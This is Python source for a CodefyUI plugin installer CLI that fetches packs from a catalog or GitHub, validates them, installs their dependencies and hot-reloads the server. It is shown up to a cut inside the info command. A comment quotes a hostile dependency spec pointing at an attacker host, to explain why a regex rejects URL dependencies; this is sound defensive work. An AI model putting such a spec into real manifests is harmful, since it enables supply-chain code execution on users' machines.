"""``cdui plugin <subcommand>`` — install, list, uninstall CodefyUI plugin packs.

Two install sources, one command::

    cdui plugin install deep                            # built-in direction pack via catalog
    cdui plugin install foo/bar                         # GitHub short form, default branch
    cdui plugin install foo/bar@v1.2.3                  # GitHub, tagged release
    cdui plugin install https://github.com/foo/bar      # full URL

Built-in catalog packs (kind=builtin in plugins/registry.json) are
activated in place — discovery walks ``<REPO>/plugins/<id>/`` directly,
nothing is copied. Third-party packs are downloaded to
``<USER_DATA>/plugins/<id>/`` via the GitHub tarball codeload endpoint.

The lockfile at ``<USER_DATA>/plugins/installed.json`` tracks every
install: source kind, SHA pin (for URL packs), declared manifest, and
which ``security.allowed_modules`` the user accepted.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError

if sys.version_info >= (3, 11):
    import tomllib
else:
    import tomli as tomllib  # 3.10 backport — same API.

from app.core.plugin_loader import (
    MANIFEST_FILENAME,
    iter_plugin_dirs,
    load_lockfile,
    plugins_builtin_root,
    plugins_user_root,
    save_lockfile,
)
from app.core.plugin_validator import PluginValidationError, validate_python_source

# ── colour + i18n (kept self-contained so scripts/dev.py owns no deps here) ──

_USE_COLOR = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
RESET = "\033[0m" if _USE_COLOR else ""
BOLD = "\033[1m" if _USE_COLOR else ""
DIM = "\033[2m" if _USE_COLOR else ""
RED = "\033[31m" if _USE_COLOR else ""
GREEN = "\033[32m" if _USE_COLOR else ""
YELLOW = "\033[33m" if _USE_COLOR else ""
CYAN = "\033[36m" if _USE_COLOR else ""


def _lang() -> str:
    forced = os.environ.get("CODEFYUI_LANG")
    if forced:
        return forced
    locale = (os.environ.get("LANG") or os.environ.get("LC_ALL") or "").lower()
    return "zh" if locale.startswith("zh") else "en"


def t(zh: str, en: str) -> str:
    return zh if _lang() == "zh" else en


def section(zh: str, en: str) -> None:
    print(f"\n{BOLD}{CYAN}▶ {t(zh, en)}{RESET}")


def info(zh: str, en: str) -> None:
    print(f"  {DIM}{t(zh, en)}{RESET}")


def warn(zh: str, en: str) -> None:
    print(f"  {YELLOW}! {t(zh, en)}{RESET}")


def err(zh: str, en: str) -> None:
    print(f"  {RED}✗ {t(zh, en)}{RESET}", file=sys.stderr)


def ok(zh: str, en: str) -> None:
    print(f"  {GREEN}✓ {t(zh, en)}{RESET}")


# ── catalog ────────────────────────────────────────────────────────────────

def _catalog_path() -> Path:
    return plugins_builtin_root() / "registry.json"


def load_catalog() -> dict[str, Any]:
    p = _catalog_path()
    if not p.exists():
        return {"schema": 1, "plugins": {}}
    try:
        return json.loads(p.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return {"schema": 1, "plugins": {}}


# ── source parsing ─────────────────────────────────────────────────────────

# Accepts owner/repo or owner/repo@ref; owner/repo names are GitHub-permissible.
_GITHUB_SHORT = re.compile(r"^([\w.-]+)/([\w.-]+?)(?:@([\w./-]+))?$")
_GITHUB_URL = re.compile(
    r"^https?://(?:www\.)?github\.com/([\w.-]+)/([\w.-]+?)(?:\.git)?/?(?:@(.+))?$"
)


def parse_source(spec: str) -> tuple[str, str, str, str]:
    """Return ``(kind, a, b, ref)``. ``kind`` ∈ {"catalog", "github"}.

    For catalog: ``a`` = plugin id; ``b`` and ``ref`` are empty.
    For github: ``a`` = owner, ``b`` = repo, ``ref`` = tag/branch/sha (may be empty).
    """
    catalog = load_catalog()
    if spec.lower() in catalog.get("plugins", {}):
        return ("catalog", spec.lower(), "", "")

    m = _GITHUB_URL.match(spec)
    if m:
        return ("github", m.group(1), m.group(2), m.group(3) or "")

    m = _GITHUB_SHORT.match(spec)
    if m:
        return ("github", m.group(1), m.group(2), m.group(3) or "")

    raise ValueError(
        f"Could not parse plugin source: {spec!r}. "
        "Expected a catalog name (e.g. foundations), owner/repo[@ref], or a GitHub URL."
    )


# ── GitHub helpers ─────────────────────────────────────────────────────────

USER_AGENT = "cdui-plugin-installer/0.1"
MAX_TARBALL_BYTES = 100 * 1024 * 1024  # 100 MB


def _gh_get(url: str, timeout: float = 30.0) -> bytes:
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read()


def resolve_sha(owner: str, repo: str, ref: str) -> str:
    """Convert tag / branch / short-sha to a full 40-char SHA."""
    target = ref or "HEAD"
    url = f"https://api.github.com/repos/{owner}/{repo}/commits/{target}"
    try:
        data = json.loads(_gh_get(url))
    except HTTPError as e:
        raise RuntimeError(
            f"GitHub API returned {e.code} for {owner}/{repo}@{target}: {e.reason}"
        ) from e
    except URLError as e:
        raise RuntimeError(f"GitHub API request failed: {e.reason}") from e
    sha = data.get("sha")
    if not sha:
        raise RuntimeError(
            f"GitHub API response for {owner}/{repo}@{target} is missing 'sha'"
        )
    return sha


def download_tarball(owner: str, repo: str, sha: str, dest: Path) -> None:
    url = f"https://codeload.github.com/{owner}/{repo}/tar.gz/{sha}"
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    bytes_read = 0
    with urllib.request.urlopen(req, timeout=60.0) as resp, dest.open("wb") as fout:
        while True:
            chunk = resp.read(64 * 1024)
            if not chunk:
                break
            bytes_read += len(chunk)
            if bytes_read > MAX_TARBALL_BYTES:
                raise RuntimeError(
                    f"Tarball exceeds {MAX_TARBALL_BYTES // (1024 * 1024)} MB limit."
                )
            fout.write(chunk)


# ── manifest ───────────────────────────────────────────────────────────────

PLUGIN_ID_RE = re.compile(r"^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$")
SUPPORTED_SCHEMA = 1


def read_manifest(plugin_root: Path) -> dict[str, Any]:
    p = plugin_root / MANIFEST_FILENAME
    if not p.exists():
        raise FileNotFoundError(f"Manifest not found at {p}")
    return tomllib.loads(p.read_text(encoding="utf-8"))


def validate_manifest(m: dict[str, Any]) -> None:
    plugin = m.get("plugin")
    if not isinstance(plugin, dict):
        raise ValueError("Manifest is missing required [plugin] table.")
    schema_version = plugin.get("schema_version")
    if schema_version != SUPPORTED_SCHEMA:
        raise ValueError(
            f"Unsupported plugin schema_version: {schema_version!r}. "
            "Upgrade cdui or use an older plugin release."
        )
    plugin_id = plugin.get("id", "")
    if not PLUGIN_ID_RE.match(plugin_id):
        raise ValueError(
            f"Invalid plugin id: {plugin_id!r}. "
            "Must match ^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$"
        )


def validate_nodes_dir(nodes_dir: Path, allowed_modules: list[str]) -> None:
    if not nodes_dir.exists():
        return
    for py in sorted(nodes_dir.rglob("*.py")):
        content = py.read_bytes()
        if not content.strip():
            continue
        validate_python_source(content, py.name, allowed_modules=allowed_modules)


# Directories within an extracted plugin tarball that are *not* imported as
# Python at runtime — safe to skip the AST gate. Everything else (top-level
# helpers, sub-packages other than ``nodes/``) gets scanned because the
# plugin loader exposes the entire plugin dir as a namespace package, so
# ``from .. import _helpers`` from inside ``nodes/foo.py`` would otherwise
# pull in unscanned code.
_VALIDATION_SKIP_DIRS = frozenset({
    "examples", "assets", "tests", "__pycache__", ".git", "docs",
})


def validate_plugin_dir(plugin_root: Path, allowed_modules: list[str]) -> None:
    """Walk the entire plugin directory and validate every Python source file.

    The original ``validate_nodes_dir`` only checked ``nodes/`` which left a
    bypass via top-level helpers. This visits all ``.py`` files except those
    in test / docs / asset directories that aren't part of the import graph.
    """
    if not plugin_root.exists():
        return
    root_resolved = plugin_root.resolve()
    for py in sorted(plugin_root.rglob("*.py")):
        rel_parts = py.resolve().relative_to(root_resolved).parts
        if any(part in _VALIDATION_SKIP_DIRS for part in rel_parts):
            continue
        content = py.read_bytes()
        if not content.strip():
            continue
        validate_python_source(content, py.name, allowed_modules=allowed_modules)


# ── runtime helpers ────────────────────────────────────────────────────────

def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _read_session_token() -> str | None:
    """Read the running server's session token from the local file.

    Returns ``None`` when the file is missing — typically because the server
    isn't running yet. ``_backend_reload`` treats that case as "skip the
    hot reload" rather than failing the install, so the user can still
    ``cdui start`` afterwards and pick up the new plugin.
    """
    try:
        from platformdirs import user_data_dir
    except ImportError:
        return None
    override = os.environ.get("CODEFYUI_USER_DATA_DIR")
    base = Path(override) if override else Path(user_data_dir("codefyui", appauthor=False))
    p = base / "session.token"
    try:
        return p.read_text(encoding="ascii").strip()
    except (OSError, UnicodeDecodeError):
        return None


def _backend_reload() -> bool:
    """POST /api/plugins/reload — best-effort hot reload.

    The server requires a session token on mutating endpoints (see
    auth_guard middleware). The token is rotated per-process and persisted
    to a 0600 file in the user data dir; we read it back here so plugin
    install / uninstall keeps working without manual configuration.
    """
    token = _read_session_token()
    if token is None:
        return False
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:8000/api/plugins/reload",
            method="POST",
            headers={
                "User-Agent": USER_AGENT,
                "Content-Length": "0",
                "X-CodefyUI-Token": token,
                "Host": "127.0.0.1:8000",  # Match the Host whitelist.
            },
            data=b"",
        )
        with urllib.request.urlopen(req, timeout=5.0):
            return True
    except (URLError, HTTPError, TimeoutError, OSError):
        return False


# PEP 508 distribution names: letters / digits / underscore / hyphen / period.
# Anything else (especially ``@``, ``git+``, ``http``, whitespace, semicolon)
# is rejected to block supply-chain RCE via the dep installer
# (``"evil @ git+https://attacker.com/evil"`` → ``uv pip install`` runs the
# attacker's ``setup.py`` regardless of how strict the AST gate is).
_SAFE_DEP_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,62}$")

# PEP 440 version specifier characters. We don't fully parse — we just refuse
# anything that *isn't* whitespace, digits, dots, commas, parens, and the
# canonical comparison operators.
_SAFE_DEP_VERSION = re.compile(r"^[\s\d.,()<>=!~*+a-zA-Z\-]*$")


class _UnsafeDepSpec(ValueError):
    """Raised when a plugin manifest's python_deps entry isn't a plain
    distribution name + version constraint."""


def _build_dep_spec(name: str, ver: str) -> str:
    """Turn a (name, version) pair into a vetted ``foo==1.2.3``-style string.

    Rejects PEP 508 extras (``foo[extra]``), URL specifiers (``foo @ url``),
    and any name with non-distribution-safe characters. Returning the spec as
    a list element for ``uv pip install`` is safe because we never invoke a
    shell — but ``uv`` itself would happily fetch ``git+`` URLs given the
    chance, and that's exactly what we're blocking here.
    """
    if not isinstance(name, str) or not _SAFE_DEP_NAME.match(name):
        raise _UnsafeDepSpec(
            f"Invalid python_deps name {name!r} — must match {_SAFE_DEP_NAME.pattern!r}"
        )
    if not isinstance(ver, str):
        ver = ""
    if ver and not _SAFE_DEP_VERSION.match(ver):
        raise _UnsafeDepSpec(
            f"Invalid python_deps version constraint for {name!r}: {ver!r}"
        )
    if not ver:
        return name
    if ver[:1] in (">", "<", "=", "~", "!"):
        return f"{name}{ver}"
    return f"{name}=={ver}"


def _install_deps(deps: dict[str, str]) -> int:
    """Install ``python_deps`` via ``uv pip`` into the codefyui venv.

    Targets the current interpreter explicitly with ``--python sys.executable``.
    ``cdui``/``dev.py`` re-exec into ``backend/.venv`` before running plugin
    commands, so ``sys.executable`` is the codefyui venv — but a bare
    ``uv pip install`` would look for a ``.venv`` relative to the *cwd* (the
    repo root, where the user invoked ``.\\cdui``), not ``backend/.venv``, and
    fail with "No virtual environment found". Pinning ``--python`` removes the
    cwd dependency.
    """
    specs: list[str] = []
    for name, ver in deps.items():
        try:
            specs.append(_build_dep_spec(name, ver))
        except _UnsafeDepSpec as e:
            err(str(e), str(e))
            return 1
    cmd = ["uv", "pip", "install", "--python", sys.executable, *specs]
    info(
        f"執行：{' '.join(cmd)}",
        f"Running: {' '.join(cmd)}",
    )
    try:
        r = subprocess.run(cmd, check=False)
    except FileNotFoundError:
        err("找不到 uv 指令", "Could not find `uv` on PATH")
        return 1
    return r.returncode


# ── commands ───────────────────────────────────────────────────────────────

def cmd_install(args: argparse.Namespace) -> int:
    sources: list[str] = args.source if isinstance(args.source, list) else [args.source]
    if not sources:
        err("沒有指定來源", "No source specified")
        return 2

    # Reload the lockfile per source so the next pre-existing check sees prior installs.
    overall = 0
    for spec in sources:
        section(f"安裝外掛：{spec}", f"Installing plugin: {spec}")
        try:
            kind, a, b, ref = parse_source(spec)
        except ValueError as e:
            err(str(e), str(e))
            return 2

        lockfile = load_lockfile()
        rc = (
            _install_catalog(a, args, lockfile)
            if kind == "catalog"
            else _install_github(a, b, ref, args, lockfile)
        )
        if rc != 0:
            return rc
        overall = rc
    return overall


def _install_catalog(plugin_id: str, args, lockfile) -> int:
    catalog = load_catalog()
    entry = catalog["plugins"][plugin_id]
    plugin_dir = plugins_builtin_root() / plugin_id

    if not (plugin_dir / MANIFEST_FILENAME).exists():
        err(
            f"目錄 {plugin_dir} 缺少 cdui.plugin.toml",
            f"Built-in pack '{plugin_id}' has no manifest at {plugin_dir}",
        )
        return 1

    try:
        manifest = read_manifest(plugin_dir)
        validate_manifest(manifest)
    except (ValueError, FileNotFoundError) as e:
        err(str(e), str(e))
        return 1

    if plugin_id in lockfile.get("plugins", {}) and not args.force:
        err(
            f"外掛 {plugin_id} 已安裝。加 --force 重新啟用。",
            f"Plugin '{plugin_id}' is already installed. Use --force to reactivate.",
        )
        return 1

    info(f"來源：{entry.get('name', plugin_id)}", f"Source: {entry.get('name', plugin_id)}")

    # Catalog packs ship inside the CodefyUI repo and are reviewed via PR —
    # the AST gate exists for the in-app .py-upload path (where untrusted
    # users supply the code) and the third-party URL path, not for code
    # we already trust. Skipping here avoids false-positives on legitimate
    # patterns like `getattr(context, "verbose", False)`.
    allowed = manifest.get("security", {}).get("allowed_modules") or []

    deps = manifest.get("python_deps", {})
    if deps:
        info(
            f"安裝 python_deps：{', '.join(deps)}",
            f"Installing python_deps: {', '.join(deps)}",
        )
        rc = _install_deps(deps)
        if rc != 0:
            return rc

    lockfile.setdefault("plugins", {})[plugin_id] = {
        "source_kind": "builtin",
        "source": plugin_id,
        "installed_at": now_iso(),
        "manifest": manifest.get("plugin", {}),
        "trusted_modules": list(allowed),
        "enabled": True,
    }
    save_lockfile(lockfile)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info(
            "伺服器未運行，下次 cdui start 會自動載入",
            "Server not running; next `cdui start` will pick this up.",
        )
    ok(f"安裝完成：{plugin_id}", f"Installed: {plugin_id}")
    return 0


def _manifest_has_frontend(manifest: dict) -> bool:
    fe = manifest.get("frontend")
    return isinstance(fe, dict) and isinstance(fe.get("entry"), str) and bool(fe.get("entry"))


def _install_github(owner: str, repo: str, ref: str, args, lockfile) -> int:
    url = f"https://github.com/{owner}/{repo}"
    info(f"來源：{url}", f"Source: {url}")
    try:
        sha = resolve_sha(owner, repo, ref)
    except RuntimeError as e:
        err(str(e), str(e))
        return 1

    short_sha = sha[:7]
    info(
        f"版本：{ref or 'default branch'} ({short_sha})",
        f"Ref: {ref or 'default branch'} ({short_sha})",
    )

    if not args.no_confirm:
        try:
            ans = input(f"  {t('繼續？', 'Proceed?')} [y/N]: ").strip().lower()
        except EOFError:
            ans = ""
        if ans not in ("y", "yes"):
            warn("已取消", "Cancelled")
            return 0

    with tempfile.TemporaryDirectory() as tmpd:
        tar = Path(tmpd) / "src.tar.gz"
        try:
            download_tarball(owner, repo, sha, tar)
        except (HTTPError, URLError, OSError, RuntimeError) as e:
            err(f"下載失敗：{e}", f"Download failed: {e}")
            return 1

        extracted = Path(tmpd) / "extracted"
        extracted.mkdir()
        try:
            with tarfile.open(tar, "r:gz") as tf:
                tf.extractall(extracted, filter="data")
        except tarfile.TarError as e:
            err(f"解壓失敗：{e}", f"Extraction failed: {e}")
            return 1

        roots = [p for p in extracted.iterdir() if p.is_dir()]
        if not roots:
            err("壓縮檔內容為空", "Tarball is empty")
            return 1
        root = roots[0]

        try:
            manifest = read_manifest(root)
            validate_manifest(manifest)
        except (ValueError, FileNotFoundError) as e:
            err(str(e), str(e))
            return 1

        if _manifest_has_frontend(manifest):
            warn(
                "此外掛包含前端 UI 程式碼（JavaScript），安裝後將在您的瀏覽器中"
                "以完整編輯器存取權限執行。請僅安裝您信任的外掛。",
                "This plugin ships frontend UI code (JavaScript). After install it"
                " runs in your browser inside CodefyUI with full editor access."
                " Only install plugins you trust.",
            )

        plugin_id = manifest["plugin"]["id"]
        allowed = manifest.get("security", {}).get("allowed_modules") or []
        if allowed and not args.trust_author:
            err(
                f"外掛要求白名單以外的模組：{', '.join(allowed)}。加 --trust-author 同意。",
                f"Plugin requests non-default modules: {', '.join(allowed)}. Pass --trust-author to accept.",
            )
            return 1

        try:
            # Validate the *entire* extracted tarball, not just nodes/. The
            # plugin loader exposes the plugin root as a namespace package so
            # ``from .. import helper`` from a node would otherwise import
            # unscanned helpers.
            validate_plugin_dir(root, allowed)
        except PluginValidationError as e:
            err(str(e), str(e))
            return 1

        # Reserved ids: anything matching a catalog-builtin slot.
        if plugin_id in load_catalog().get("plugins", {}):
            err(
                f"外掛 id {plugin_id} 與內建保留名稱衝突",
                f"Plugin id '{plugin_id}' is reserved by the built-in catalog",
            )
            return 1

        final = plugins_user_root() / plugin_id
        if final.exists() and not args.force:
            err(
                f"外掛 {plugin_id} 已安裝。加 --force 重新安裝。",
                f"Plugin '{plugin_id}' already installed. Use --force to overwrite.",
            )
            return 1

        staging = plugins_user_root() / ".staging" / f"{plugin_id}-{short_sha}"
        staging.parent.mkdir(parents=True, exist_ok=True)
        if staging.exists():
            shutil.rmtree(staging)
        shutil.copytree(root, staging)

        backup: Path | None = None
        if final.exists():
            backup = final.with_name(f"{plugin_id}.old-{int(time.time())}")
            final.rename(backup)
        try:
            staging.rename(final)
        except OSError as e:
            if backup is not None:
                backup.rename(final)
            err(f"安裝失敗：{e}", f"Install failed: {e}")
            return 1

        deps = manifest.get("python_deps", {})
        if deps:
            info(
                f"安裝 python_deps：{', '.join(deps)}",
                f"Installing python_deps: {', '.join(deps)}",
            )
            rc = _install_deps(deps)
            if rc != 0:
                shutil.rmtree(final, ignore_errors=True)
                if backup is not None:
                    backup.rename(final)
                return rc

        lockfile.setdefault("plugins", {})[plugin_id] = {
            "source_kind": "github_url",
            "source": f"{owner}/{repo}" + (f"@{ref}" if ref else ""),
            "url": url,
            "ref": ref,
            "sha": sha,
            "installed_at": now_iso(),
            "manifest": manifest.get("plugin", {}),
            "trusted_modules": list(allowed),
            "enabled": True,
        }
        save_lockfile(lockfile)

        if backup is not None:
            shutil.rmtree(backup, ignore_errors=True)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info(
            "伺服器未運行，下次 cdui start 會自動載入",
            "Server not running; next `cdui start` will pick this up.",
        )

    ok(
        f"安裝完成：{plugin_id} ({short_sha})",
        f"Installed: {plugin_id} ({short_sha})",
    )
    return 0


def cmd_list(args: argparse.Namespace) -> int:
    lockfile = load_lockfile()
    plugins = lockfile.get("plugins", {})
    if not plugins:
        info("尚未安裝任何外掛", "No plugins installed yet")
        return 0

    section("已安裝外掛", "Installed plugins")
    width = max(len(pid) for pid in plugins) + 2
    for plugin_id, entry in sorted(plugins.items()):
        manifest = entry.get("manifest", {})
        name = manifest.get("name", plugin_id)
        version = manifest.get("version", "")
        kind = entry.get("source_kind", "")
        src = entry.get("source", "")
        enabled = entry.get("enabled", True)
        bits: list[str] = []
        if version:
            bits.append(f"v{version}")
        bits.append(f"{kind}:{src}")
        if entry.get("sha"):
            bits.append(entry["sha"][:7])
        if enabled:
            # Normal layout — bold id, plain name, dim metadata.
            print(
                f"  {BOLD}{plugin_id.ljust(width)}{RESET}{name}  {DIM}{'  '.join(bits)}{RESET}"
            )
        else:
            # Whole row dimmed + explicit [disabled] tag so it's obvious
            # the plugin is installed but inactive.
            print(
                f"  {DIM}{plugin_id.ljust(width)}{name}  [disabled]  {'  '.join(bits)}{RESET}"
            )
    return 0


def _set_enabled(plugin_id: str, enabled: bool) -> int:
    """Shared body for ``cmd_enable`` / ``cmd_disable``.

    Flips the ``enabled`` field on the lockfile entry, persists, and asks
    the running server to hot-reload its registry. Returns CLI exit code.
    """
    verb_zh = "啟用" if enabled else "停用"
    verb_en = "Enabling" if enabled else "Disabling"
    section(f"{verb_zh}外掛：{plugin_id}", f"{verb_en} plugin: {plugin_id}")

    lockfile = load_lockfile()
    entry = lockfile.get("plugins", {}).get(plugin_id)
    if not entry:
        err(
            f"找不到外掛 {plugin_id}（請先 install）",
            f"Plugin '{plugin_id}' is not installed (run install first)",
        )
        return 1

    current = entry.get("enabled", True)
    if current == enabled:
        state_zh = "已啟用" if enabled else "已停用"
        state_en = "already enabled" if enabled else "already disabled"
        info(f"{plugin_id} {state_zh}（無動作）", f"{plugin_id} is {state_en} (no-op)")
        return 0

    entry["enabled"] = enabled
    save_lockfile(lockfile)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info("伺服器未運行", "Server not running")

    done_zh = "已啟用" if enabled else "已停用"
    done_en = "Enabled" if enabled else "Disabled"
    ok(f"{done_zh} {plugin_id}", f"{done_en} {plugin_id}")
    return 0


def cmd_enable(args: argparse.Namespace) -> int:
    return _set_enabled(args.plugin_id.lower(), True)


def cmd_disable(args: argparse.Namespace) -> int:
    return _set_enabled(args.plugin_id.lower(), False)


def cmd_uninstall(args: argparse.Namespace) -> int:
    plugin_id = args.plugin_id.lower()
    section(f"移除外掛：{plugin_id}", f"Uninstalling plugin: {plugin_id}")

    lockfile = load_lockfile()
    entry = lockfile.get("plugins", {}).get(plugin_id)
    if not entry:
        err(f"找不到外掛 {plugin_id}", f"Plugin '{plugin_id}' is not installed")
        return 1

    if entry.get("source_kind") == "github_url":
        plugin_dir = plugins_user_root() / plugin_id
        if plugin_dir.exists():
            try:
                shutil.rmtree(plugin_dir)
            except OSError as e:
                err(f"刪除失敗：{e}", f"Failed to remove {plugin_dir}: {e}")
                return 1

    lockfile["plugins"].pop(plugin_id, None)
    save_lockfile(lockfile)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info("伺服器未運行", "Server not running")

    ok(f"已移除 {plugin_id}", f"Removed {plugin_id}")
    return 0


def _link_local(root: Path, *, force: bool) -> int:
    """Link a local plugin directory in place — shared by ``link`` and ``dev``.

    Records ``source_kind="local"`` with the directory's absolute ``path`` in the
    lockfile, so the loader walks the author's own working tree. The AST security
    gate is skipped — this is your own code — but a warning is printed, matching
    the built-in/catalog trust model.
    """
    section(f"連結本地外掛：{root}", f"Linking local plugin: {root}")

    if not (root / MANIFEST_FILENAME).exists():
        err(
            f"目錄缺少 {MANIFEST_FILENAME}：{root}",
            f"No {MANIFEST_FILENAME} found in {root}",
        )
        return 1

    try:
        manifest = read_manifest(root)
        validate_manifest(manifest)
    except (ValueError, FileNotFoundError) as e:
        err(str(e), str(e))
        return 1

    plugin_id = manifest["plugin"]["id"]

    if plugin_id in load_catalog().get("plugins", {}):
        err(
            f"id '{plugin_id}' 與內建套件衝突，請在 manifest 改用其他 id",
            f"id '{plugin_id}' collides with a built-in pack — rename it in the manifest",
        )
        return 1

    lockfile = load_lockfile()
    if plugin_id in lockfile.get("plugins", {}) and not force:
        err(
            f"外掛 {plugin_id} 已安裝/連結。加 --force 覆寫。",
            f"Plugin '{plugin_id}' is already installed/linked. Use --force to overwrite.",
        )
        return 1

    info(f"id：{plugin_id}", f"id: {plugin_id}")
    warn(
        "本地連結會跳過 AST 安全檢查（視為你信任的程式碼）",
        "Local link skips the AST security gate (treated as your own trusted code)",
    )
    if _manifest_has_frontend(manifest):
        warn(
            "此外掛含前端 JS，會在編輯器中以完整權限執行",
            "This plugin ships frontend JS that runs in the editor with full access",
        )

    deps = manifest.get("python_deps", {})
    if deps:
        info(
            f"安裝 python_deps：{', '.join(deps)}",
            f"Installing python_deps: {', '.join(deps)}",
        )
        rc = _install_deps(deps)
        if rc != 0:
            return rc

    allowed = manifest.get("security", {}).get("allowed_modules") or []
    lockfile.setdefault("plugins", {})[plugin_id] = {
        "source_kind": "local",
        "source": str(root),
        "path": str(root),
        "installed_at": now_iso(),
        "manifest": manifest.get("plugin", {}),
        "trusted_modules": list(allowed),
        "enabled": True,
    }
    save_lockfile(lockfile)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info(
            "伺服器未運行，下次 cdui start 會自動載入",
            "Server not running; next `cdui start` will pick this up.",
        )
    ok(
        f"已連結：{plugin_id}（編輯後執行 cdui plugin reload 更新）",
        f"Linked: {plugin_id} (run `cdui plugin reload` after edits to refresh)",
    )
    return 0


def cmd_link(args: argparse.Namespace) -> int:
    """Link a local plugin directory for development — loaded in place, no copy.

    The dev-loop counterpart to ``install``: instead of downloading a tarball, it
    points the lockfile at the author's own working tree. Edits are picked up by
    ``cdui plugin reload`` (or the next ``cdui start``); ``cdui plugin dev``
    automates that.
    """
    return _link_local(Path(args.path).expanduser().resolve(), force=args.force)


def cmd_unlink(args: argparse.Namespace) -> int:
    """Remove a linked local plugin — drops the lockfile entry only.

    Unlike ``uninstall``, this never deletes files: a linked plugin's files are
    the author's own working directory. Refuses non-local entries so a real
    install isn't silently dropped.
    """
    plugin_id = args.plugin_id.lower()
    section(f"取消連結：{plugin_id}", f"Unlinking plugin: {plugin_id}")

    lockfile = load_lockfile()
    entry = lockfile.get("plugins", {}).get(plugin_id)
    if not entry:
        err(f"找不到外掛 {plugin_id}", f"Plugin '{plugin_id}' is not installed")
        return 1
    if entry.get("source_kind") != "local":
        err(
            f"{plugin_id} 不是本地連結（請改用 cdui plugin uninstall）",
            f"'{plugin_id}' is not a local link — use `cdui plugin uninstall` instead",
        )
        return 1

    lockfile["plugins"].pop(plugin_id, None)
    save_lockfile(lockfile)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info("伺服器未運行", "Server not running")

    ok(
        f"已取消連結 {plugin_id}（你的檔案未被刪除）",
        f"Unlinked {plugin_id} (your files were not deleted)",
    )
    return 0


def cmd_reload(args: argparse.Namespace) -> int:
    """Ask the running server to hot-reload nodes/presets.

    The manual trigger for the dev loop: edit a linked plugin, then
    ``cdui plugin reload`` to see the change without restarting the server.
    """
    section("熱重載外掛", "Reloading plugins")
    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
        return 0
    info(
        "伺服器未運行（啟動後變更會自動載入）",
        "Server not running (changes load on next start)",
    )
    return 0


def _scan_plugin_files(root: Path) -> dict[str, float]:
    """mtime signature of a plugin's reload-relevant files.

    Covers the manifest plus everything under ``nodes/``, ``presets/`` and
    ``frontend/`` — the directories whose changes affect a running editor.
    ``__pycache__`` and other files (README, ``ui/`` source before it is built)
    are ignored so editor-irrelevant saves don't trigger reloads.
    """
    sig: dict[str, float] = {}
    manifest = root / MANIFEST_FILENAME
    if manifest.is_file():
        try:
            sig[str(manifest)] = manifest.stat().st_mtime
        except OSError:
            pass
    for sub in ("nodes", "presets", "frontend"):
        d = root / sub
        if not d.is_dir():
            continue
        for f in d.rglob("*"):
            if f.is_file() and "__pycache__" not in f.parts:
                try:
                    sig[str(f)] = f.stat().st_mtime
                except OSError:
                    pass
    return sig


def cmd_dev(args: argparse.Namespace) -> int:
    """Link a local plugin and watch it, hot-reloading on every change.

    The one-command dev loop: links the directory (idempotent), then polls its
    manifest / nodes / presets / frontend for edits and POSTs
    ``/api/plugins/reload`` whenever something changes. Run the server in another
    terminal (``cdui start`` / ``cdui dev``). Python edits take effect on the
    next reload; a changed frontend bundle additionally needs a browser refresh.
    ``--once`` links + reloads a single time and exits (no watch).
    """
    root = Path(args.path).expanduser().resolve()
    rc = _link_local(root, force=True)
    if rc != 0:
        return rc
    if getattr(args, "once", False):
        return 0

    interval = max(0.2, float(getattr(args, "interval", 1.0) or 1.0))
    section("開發監看模式", "Dev watch mode")
    info(
        f"監看 {root}（每 {interval:g}s 檢查一次，Ctrl+C 結束）",
        f"Watching {root} (polling every {interval:g}s; Ctrl+C to stop)",
    )
    sig = _scan_plugin_files(root)
    try:
        while True:
            time.sleep(interval)
            new_sig = _scan_plugin_files(root)
            if new_sig == sig:
                continue
            sig = new_sig
            info("偵測到變更，重載中…", "Change detected, reloading…")
            if _backend_reload():
                ok(
                    "熱重載完成（前端變更請重新整理瀏覽器）",
                    "Hot-reloaded (refresh the browser for frontend changes)",
                )
            else:
                warn("伺服器未運行", "Server not running")
    except KeyboardInterrupt:
        print()
        info("已停止監看", "Stopped watching")
    return 0


def cmd_info(args: argparse.Namespace) -> int:
    spec = args.source_or_id
    lockfile = load_lockfile()

    if spec.lower() in lockfile.get("plugins", {}):
        plugin_id = spec.lower()
        entry = lockfile["plugins"][plugin_id]
        plugin_dir = (
            plugins_builtin_root() / plugin_id
            if entry.get("source_kind") == "builtin"
            else plugins_user_root() / plugin_id
        )
        manifest: dict[str, Any]
        try:
            manifest = read_manifest(plugin_dir)
        except (FileNotFoundError, OSError):
            manifest = {"plugin": entry.get("manifest", {})}
        _print_info(plugin_id, manifest, entry, plugin_dir, installed=True)
        return 0

    try:
        kind, a, b, ref = parse_source(spec)
    except ValueError as e:
        err(str(e), str(e))
        return 2

    if kind == "catalog":
        catalog_entry = load_catalog()["plugins"][a]
        plugin_dir = plugins_builtin_root() / a
        try:
            manifest = read_manifest(plugin_dir)
        except FileNotFoundError:
            manifest = {"plugin": {"name": catalog_entry.get("name", a)}}
        synthetic_entry = {
            "source_kind": "builtin",
            "source": a,
            "manifest": manifest.get("plugin", {}),
        }
        _print_info(a, manifest, synthetic_entry, plugin_dir, installed=False)
        return 0

    owner, repo, ref = a, b, ref
    try:
        sha = resolve_sha(owner, repo, ref)
    except RuntimeError as e:
        err(str(e), str(e))
        return 1
    raw = f"https://raw.githubusercontent.com/{owner}/{repo}/{sha}/cdui.plugin.toml"
    try:
